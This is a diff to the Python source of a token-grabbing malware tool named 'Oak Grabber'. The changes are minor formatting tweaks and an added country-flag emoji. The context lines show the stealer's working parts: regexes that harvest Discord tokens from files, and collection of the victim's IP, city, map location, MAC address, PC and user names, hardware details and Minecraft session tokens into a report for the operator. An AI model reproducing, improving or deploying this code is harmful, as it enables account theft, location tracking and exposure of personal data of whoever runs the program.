@@ -101,7 +101,7 @@ def find_tokens(path):
             for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}', r'[\w-]{26}\.[\w-]{6}\.[\w-]{38}', r'[\w-]{24}\.[\w-]{6}\.[\w-]{38}'):
                 for token in re.findall(regex, line):
                     checked.append(token)
-                    dctokens+=(f"{token} \n\n")
+                    dctokens+=(f"{token}\n\n")
     return checked
  except:
     pass
@@ -162,11 +162,12 @@ def main():
             ip = data.get('ip')
             city = data.get('city')
             country = data.get('country')
+            country2 = data.get('country').lower()
             region = data.get('region')
             org = data.get('org')
             loc = data.get('loc')
             googlemap = "https://www.google.com/maps/search/google+map++" + loc
-    ip_addr = requests.get('https://api.ipify.org').content.decode('utf8')
+            globalinfo = f":flag_{country2}:"
     Oakname = socket.gethostname()
     pc_username = os.getenv("UserName")
     checked = []
@@ -221,7 +222,7 @@ def main():
                 if token in checked:
                     continue
                 checked.append(token)
-                dctokens+=(f"""{token}\n\n""")
+                dctokens+=(f"""{token} \n\n""")
                 embedMsg = f"""**someone ran ur Oak Grabber <:wiseoaktree:1035527213543596062>**\n\n**Tokens:** ```{dctokens}```"""
         else:
             embedMsg = '''**someone ran ur Oak Grabber <:wiseoaktree:1035527213543596062>**\n\n```No tokens found.```'''
@@ -683,7 +684,7 @@ Email: {email if email else ""}\n"""
                              "url": "https://github.com/j0taro/Oak-token-Grabber",
                              "icon_url": "https://i.imgur.com/bbWgtHI.png"
                          },
-                         "description": f"""{embedMsg}\n**__PC INFO__ <:pc:1035526269925867640>**\n**RAM:** `{ramg}`\n**Disk:** `{disk}GB`\n**CPU:**`{cpu}`\n**GPU:**`{gpu}`\n**Refresh rate:** `{rr}`\n**Model name:** `{mn}`\n**Build manufacturer:** `{bm}`\n**Resolution:** `{size}`\n**Platform:** `{platform}`\n**PC-Name:** `{Oakname}`\n**PC-User:** `{pc_username}`\n**__IP INFO__ <:loc:1035525770258415657>**\n**IP:** `{ip}`\n**City:** `{city}`\n**Country:** `{country}`\n**Region:** `{region}`\n**Org:** `{org}`\n**Mac:** `{mac}`\n**Loc:** `{loc}`\n**Googlemap:** [Googlemap location]({"https://www.google.com/maps/search/google+map++" + loc})\n__**Minecraft Info <:fr:1035524460939329617>**__ \n**Minecraft Profile:** `{McUsername}`\n**Token:** `{McToken}`\n **Account type:** `{sessionType}`\n **Name:** `{McUser}`\n**Elapsed time:** `{time.time() - starttime}`\n```yaml\n{fc} Files Found:\n{f}{f2}```""",
+                         "description": f"""{embedMsg}\n**__PC INFO__ <:pc:1035526269925867640>**\n**RAM:** `{ramg}`\n**Disk:** `{disk}GB`\n**CPU:**`{cpu}`\n**GPU:**`{gpu}`\n**Refresh rate:** `{rr}`\n**Model name:** `{mn}`\n**Build manufacturer:** `{bm}`\n**Resolution:** `{size}`\n**Platform:** `{platform}`\n**PC-Name:** `{Oakname}`\n**PC-User:** `{pc_username}`\n**__IP INFO__ <:loc:1035525770258415657>**\n**IP:** `{ip}`\n**City:** `{city}`\n**Country:** `{country}`\n**Country Emoji:** {globalinfo}\n**Region:** `{region}`\n**Org:** `{org}`\n**Mac:** `{mac}`\n**Loc:** `{loc}`\n**Googlemap:** [Googlemap location]({"https://www.google.com/maps/search/google+map++" + loc})\n__**Minecraft Info <:fr:1035524460939329617>**__ \n**Minecraft Profile:** `{McUsername}`\n**Token:** `{McToken}`\n **Account type:** `{sessionType}`\n **Name:** `{McUser}`\n**Elapsed time:** `{time.time() - starttime}`\n```yaml\n{fc} Files Found:\n{f}{f2}```""",
                          "color": 0x1e8a81,
                          "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                          "thumbnail": {
